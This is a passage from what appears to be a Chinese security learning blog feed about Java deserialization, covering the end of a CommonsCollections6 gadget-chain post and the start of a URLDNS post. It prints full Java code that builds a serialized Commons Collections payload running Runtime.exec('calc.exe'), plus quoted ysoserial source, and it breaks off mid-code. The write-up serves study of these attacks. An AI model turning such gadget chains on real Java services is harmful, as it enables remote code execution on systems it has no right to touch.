^ (h &gt;&gt;&gt; <span class="hljs-number">16</span>);<br>    &#125;<br>     <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream s)</span><br>        <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; mappings; i++) &#123;<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> (K) s.readObject();<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    <span class="hljs-type">V</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (V) s.readObject();<br>                putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <br></code></pre></td></tr></table></figure><p>在HashMap的readObject⽅法中，调⽤到了 <code>hash(key)</code> ，⽽hash⽅法中，调⽤到了<code>key.hashCode()</code> 。所以，我们只需要让这个key等于<code>TiedMapEntry</code>对象，即可连接上前⾯的分析过程，构成⼀个完整的Gadget</p><h3 id="构建Gadget代码"><a href="#构建Gadget代码" class="headerlink" title="构建Gadget代码"></a>构建Gadget代码</h3><p>先构造恶意LazyMap</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] fakeTransformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)&#125;;<br>Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]&#125;),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>),<br>&#125;;<br><span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(fakeTransformers);<br><span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>LazyMap.decorate(innerMap,transformerChain);<br></code></pre></td></tr></table></figure><p>上述代码，为了避免本地调试时触发命令执⾏，我构造LazyMap的时候先⽤了⼀个⼈畜⽆害的 fakeTransformers 对象，等最后要⽣成Payload的时候，再把真正的 transformers 替换进去。现在，我拿到了⼀个恶意的LazyMap对象 outerMap ，将其作为 TiedMapEntry 的map属性</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tme</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(outerMap, <span class="hljs-string">&quot;keykey&quot;</span>);<br></code></pre></td></tr></table></figure><p>接着，为了调⽤ TiedMapEntry#hashCode() ，我们需要将 tme 对象作为 HashMap 的⼀个key。注意，这⾥我们需要新建⼀个HashMap，⽽不是⽤之前LazyMap利⽤链⾥的那个HashMap，两者没任何关系：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//TiedMapEntry</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getValue();<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">this</span>.getKey() == <span class="hljs-literal">null</span> ? <span class="hljs-number">0</span> : <span class="hljs-built_in">this</span>.getKey().hashCode()) ^ (value == <span class="hljs-literal">null</span> ? <span class="hljs-number">0</span> : value.hashCode());<br>    &#125;<br><span class="hljs-comment">//如果键值为 null，则使用 0 作为键值的哈希码；否则使用键值本身的哈希码；</span><br><span class="hljs-comment">//如果值为 null，则使用 0 作为值的哈希码；否则使用值本身的哈希码；</span><br><span class="hljs-comment">//对上述两个哈希码进行位异或运算，得到最终的哈希值。</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Map</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>expMap.put(tme, <span class="hljs-string">&quot;valuevalue&quot;</span>);<br></code></pre></td></tr></table></figure><p>最后，我就可以将这个 expMap 作为对象来序列化了，不过，别忘了将真正的 transformers 数组设置进来</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// ==================</span><br><span class="hljs-comment">// 将真正的transformers数组设置进来</span><br><span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>f.setAccessible(<span class="hljs-literal">true</span>);<br>f.set(transformerChain, transformers);<br><span class="hljs-comment">// ==================</span><br><span class="hljs-comment">// ⽣成序列化字符串</span><br><span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br><span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>oos.writeObject(expMap);<br>oos.close();<br></code></pre></td></tr></table></figure><p>于是我们的利用链成了这个样子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.payloads;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CommonsCollections6_p</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] fakeTransformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<span class="hljs-keyword">new</span><br>            <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)&#125;;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;<br>                String.class,<br>                Class[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; <span class="hljs-string">&quot;getRuntime&quot;</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>] &#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;<br>                Object.class,<br>                Object[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; <span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span><br>                <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>] &#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; String.class<br>            &#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] &#123; <span class="hljs-string">&quot;calc.exe&quot;</span> &#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>),<br>        &#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span><br>            <span class="hljs-title class_">ChainedTransformer</span>(fakeTransformers);<br>        <span class="hljs-comment">// 不再使⽤原CommonsCollections6中的HashSet，直接使⽤HashMap</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap, transformerChain);<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tme</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(outerMap, <span class="hljs-string">&quot;keykey&quot;</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        expMap.put(tme, <span class="hljs-string">&quot;valuevalue&quot;</span>);<br>        <br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span><br>            ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.set(transformerChain, transformers);<br>        <span class="hljs-comment">// ==================</span><br>        <span class="hljs-comment">// ⽣成序列化字符串</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        oos.writeObject(expMap);<br>        oos.close();<br>        <span class="hljs-comment">// 本地测试触发</span><br>        System.out.println(barr);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span><br>            <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object)ois.readObject();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>但是什么也没有发生</p><h3 id="为何无法利用"><a href="#为何无法利用" class="headerlink" title="为何无法利用"></a>为何无法利用</h3><p>我们来反思⼀下，为什么我们构造的Gadget没有成功执⾏命令？</p><p>单步调试⼀下，你会发现关键点在LazyMap的get⽅法，下图我画框的部分，就是最后触发命令执⾏的transform() ，但是这个if语句并没有进⼊，因为 map.containsKey(key) 的结果是true：</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191227554.png" alt="image-20230214213215733"> </p><p>这里要看是True还是False的话需要加一个监视，右键选中变量即可</p><p>但是很奇怪，无论<code>outerMap.remove(&quot;keykey&quot;)</code> 这一行是否存在，map**.**ContainKey始终等于False，始终能进入循环</p><p>这里感觉p说的有点矛盾，</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191224564.png" alt="image-20230214214954404"> </p><p>里面已经放入了key，但是</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191225526.png" alt="image-20230214215019248"> 却说自己放了</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>URLDNS</title>
    <link href="/decemberus.com/2022/11/02/URLDNS/"/>
    <url>/decemberus.com/2022/11/02/URLDNS/</url>
    
    <content type="html"><![CDATA[<h1 id="Java反序列化之URLDNS"><a href="#Java反序列化之URLDNS" class="headerlink" title="Java反序列化之URLDNS"></a>Java反序列化之URLDNS</h1><h2 id="反序列化方法比较"><a href="#反序列化方法比较" class="headerlink" title="反序列化方法比较"></a>反序列化方法比较</h2><p>Java的反序列化和PHP的反序列化其实有点类似，他们都只能将一个对象中的属性按照某种特定的格式生成一段数据流，在反序列化的时候再按照这个格式将属性拿回来，再赋值给新的对象。</p><p>但Java相对PHP序列化更深入的地方在于，其提供了更加高级、灵活地方法 writeObject ，允许开发者在序列化流中插入一些自定义数据，进而在反序列化的时候能够使用 readObject 进行读取。</p><p>当然，PHP中也提供了一个魔术方法叫 <code>__wakeup</code> ，在反序列化的时候进行触发。很多人会认为Java的readObject 和PHP的 <code>__wakeup</code> 类似，但其实不全对，虽然都是在反序列化的时候触发，但他们解决</p><p>的问题稍微有些差异。</p><p>Java设计 readObject 的思路和PHP的 <code>__wakeup</code> 不同点在于： readObject 倾向于解决“<strong>反序列化时如何还原一个完整对象”</strong>这个问题，而PHP的 <code>__wakeup</code> 更倾向于解决“<strong>反序列化后如何初始化这个对象</strong>”的问题。</p><h3 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h3><p>PHP的序列化是开发者不能参与的，开发者调用 serialize 函数后，序列化的数据就已经完成了，你得到的是一个完整的对象，你并不能在序列化数据流里新增某一个内容，你如果想插入新的内容，只有将其保存在一个属性中。也就是说PHP的序列化、反序列化是一个纯内部的过程，而其 <code>__sleep</code> 、<code>__wakeup</code> 魔术方法的目的就是在序列化、反序列化的前后执行一些操作。</p><p>一个非常典型的PHP序列化例子，就是含有资源类型的PHP类，如数据库连接</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Connection</span></span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$link</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$dsn</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$dsn</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;dsn = <span class="hljs-variable">$dsn</span>;<br><span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br><span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">connect</span>();<br>&#125;<br><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">connect</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;link = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(<span class="hljs-variable">$this</span>-&gt;dsn, <span class="hljs-variable">$this</span>-&gt;username, <span class="hljs-variable">$this</span>-<br>&gt;password);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>PHP中，资源类型的对象默认是不会写入序列化数据中的。那么上述Connection类的 $link 属性在序列化后就是null，反序列化时拿到的也是null。</p><p>那么，如果我想要反序列化时拿到的 <code>$link</code> 就是一个数据库连接，我就需要编写 <code>__wakeup</code> 方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Connection</span></span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$link</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$dsn</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$dsn</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;dsn = <span class="hljs-variable">$dsn</span>;<br><span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br><span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">connect</span>();<br>&#125;<br><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">connect</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;link = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(<span class="hljs-variable">$this</span>-&gt;dsn, <span class="hljs-variable">$this</span>-&gt;username, <span class="hljs-variable">$this</span>-<br>&gt;password);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__sleep</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;dsn&#x27;</span>, <span class="hljs-string">&#x27;username&#x27;</span>, <span class="hljs-string">&#x27;password&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">connect</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>可见，这里 <code>__wakeup</code> 的工作就是在反序列化拿到Connection对象后，执行 connect() 函数，连接数据库。</p><p><code>__wakeup</code> 的作用在反序列化后，执行一些初始化操作。但其实我们很少利用序列化数据传递资源类型的对象，而其他类型的对象，在反序列化的时候就已经赋予其值了。</p><p>所以你会发现，PHP的反序列化漏洞，很少是由 <code>__wakeup</code> 这个方法触发的，通常触发在析构函数</p><p><code>__destruct</code> 里。其实大部分PHP反序列化漏洞，都并不是由反序列化导致的，只是通过反序列化可以控制对象的属性，进而在后续的代码中进行危险操作</p><h3 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="Java反序列化"></a>Java反序列化</h3><p>Java反序列化的操作，很多是需要开发者深入参与的，所以你会发现大量的库会实现 readObject 、writeObject 方法，这和PHP中 <code>__wakeup</code> 、 <code>__sleep</code> 很少使用是存在鲜明对比的。</p><p>这次再来说说objectAnnotation 。</p><p>Java在序列化时一个对象，将会调用这个对象中的 writeObject 方法，参数类型是ObjectOutputStream ，开发者可以将任何内容写入这个stream中；反序列化时，会调用readObject ，开发者也可以从中读取出前面写入的内容，并进行处理。</p><p>举个例子，我编写了一个Person类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">java</span>.io.Serializable &#123;<br>    <span class="hljs-keyword">public</span> String name;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> age;<br>    Person(String name, <span class="hljs-type">int</span> age) &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeObject</span><span class="hljs-params">(java.io.ObjectOutputStream s)</span> <span class="hljs-keyword">throws</span><br>            IOException &#123;<br>        s.defaultWriteObject();<br>        s.writeObject(<span class="hljs-string">&quot;This is a object&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br>            <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        s.defaultReadObject();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> (String) s.readObject();<br>        System.out.println(message);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可见，我这里在执行完默认的 s.defaultWriteObject() 后，我向stream里写入了一个字符串 Thisis a object 。我们用上一章讲的工具SerializationDumper查看此时生成的序列化数据：</p><p><img src="D:\mdimage\image-20221231155054925.png" alt="image-20221231155054925"> </p><p><img src="D:\mdimage\image-20221231155102223.png" alt="image-20221231155102223"> </p><p>可见，我们写入的字符串 This is a object 被放在 objectAnnotation 的位置。</p><p>在反序列化时，我读取了这个字符串，并将其输出：</p><p><img src="D:\mdimage\image-20221231155130319.png" alt="image-20221231155130319"> </p><p>这个特性就让Java的开发变得非常灵活。比如后面将会讲到的HashMap，其就是将Map中的所有键、</p><p>值都存储在 objectAnnotation 中，而并不是某个具体属性里。</p><p>关于一些具体类是如何使用 readObject 方法的，我们后面在说到gadget的时候会详细分析。</p><h2 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h2><p>URLDNS 就是ysoserial中⼀个利⽤链的名字，但准确来说，这个其实不能称作“利⽤链”。因为其参数不是⼀个可以“利⽤”的命令，⽽仅为⼀个URL，其能触发的结果也不是命令执⾏，⽽是⼀次DNS请求。</p><p>虽然这个“利⽤链”实际上是不能“利⽤”的，但因为其如下的优点，⾮常适合我们在检测反序列化漏洞时使⽤：</p><ul><li>使⽤Java内置的类构造，对第三⽅库没有依赖</li><li>在⽬标没有回显的时候，能够通过DNS请求得知是否存在反序列化漏洞</li></ul><p>以下为ysoerial的源代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">URLDNS</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ObjectPayload</span>&lt;Object&gt; &#123;<br><br>        <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getObject</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String url)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>                <span class="hljs-comment">//Avoid DNS resolution during payload creation</span><br>                <span class="hljs-comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span><br>                <span class="hljs-type">URLStreamHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SilentURLStreamHandler</span>();<br><br>                <span class="hljs-type">HashMap</span> <span class="hljs-variable">ht</span> <span 